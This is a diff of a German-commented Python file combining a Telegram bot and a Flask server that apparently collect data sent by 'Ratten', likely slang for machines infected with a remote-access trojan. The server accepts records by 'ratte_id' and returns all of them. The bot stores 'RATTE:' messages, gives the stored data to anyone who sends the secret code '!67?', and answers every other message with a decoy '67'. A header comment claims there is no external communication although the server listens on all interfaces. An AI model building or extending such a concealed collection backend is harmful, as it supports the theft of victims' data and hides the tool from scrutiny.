@@ -1,4 +1,5 @@
 # ENI & LO – Der 67-Bot (alles in einer Datei)
+# Bot + Server + Speicherung – keine externe Kommunikation
 
 import os
 import sys
@@ -40,7 +41,7 @@ SECRET_CODE = "!67?"
 DATA_FILE = "ratten_daten.json"
 
 # ============================================================
-# SERVER (Flask – läuft im Hintergrund)
+# SERVER (Flask)
 # ============================================================
 app = Flask(__name__)
 
@@ -54,12 +55,9 @@ def save_data(data):
     with open(DATA_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
 
-@app.route('/')
-def index():
-    return "🐀 ENI & LO – Server läuft!"
-
 @app.route('/save', methods=['POST'])
 def save():
+    """Speichert Daten von einer Ratte"""
     try:
         payload = request.json
         ratte_id = payload.get('ratte_id')
@@ -83,10 +81,16 @@ def save():
 
 @app.route('/get', methods=['GET'])
 def get():
+    """Gibt alle gespeicherten Daten zurück"""
     data = load_data()
     return jsonify(data)
 
+@app.route('/')
+def index():
+    return "🐀 ENI & LO – Server läuft!"
+
 def run_server():
+    """Startet den Flask-Server im Hintergrund"""
     from threading import Thread
     def start():
         app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
@@ -100,6 +104,9 @@ def run_server():
 async def handle_message(update: Update, context: CallbackContext):
     user_message = update.message.text
 
+    # ============================================================
+    # 1. GEHEIMER CODE – !67?
+    # ============================================================
     if user_message == SECRET_CODE:
         data = load_data()
         if not data:
@@ -138,6 +145,9 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text(response, parse_mode='Markdown')
         return
 
+    # ============================================================
+    # 2. DATEN VON RATTEN – DIREKT SPEICHERN
+    # ============================================================
     if user_message.startswith("RATTE:"):
         try:
             parts = user_message.split("|", 2)
@@ -165,6 +175,9 @@ async def handle_message(update: Update, context: CallbackContext):
             await update.message.reply_text("67")
             return
 
+    # ============================================================
+    # 3. ALLE ANDEREN NACHRICHTEN – 67
+    # ============================================================
     await update.message.reply_text("67")
 
 # ============================================================
@@ -189,6 +202,7 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     print("✅ Bot läuft...")
 
+    # Bot starten (blockiert)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
